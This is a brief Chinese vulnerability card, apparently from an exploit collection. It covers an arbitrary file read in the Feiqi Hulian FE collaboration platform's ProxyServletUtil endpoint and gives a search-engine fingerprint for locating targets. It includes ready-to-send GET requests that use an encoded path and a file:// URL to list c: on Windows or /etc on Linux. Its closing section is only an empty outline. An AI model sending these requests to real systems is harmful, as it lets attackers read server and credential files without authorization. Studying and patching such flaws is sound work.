# 飞企互联FE业务协作平台ProxyServletUti存在任意文件读取漏洞

- **系统**：飞企互联FE业务协作平台　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name=="飞企互联 FE 6.0+"`
- **请求**：`GET /ProxyServletUti%6c?url=file:///c: HTTP/1.1`

**请求体 / payload**
```
windows
Host: {hostname}

linux
GET /ProxyServletUti%6c?url=file:///etc HTTP/1.1
Host: {hostname}
```

**其他**
- 飞企互联 FE 业务协作平台ProxyServletUti存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 飞企互联FE业务协作平台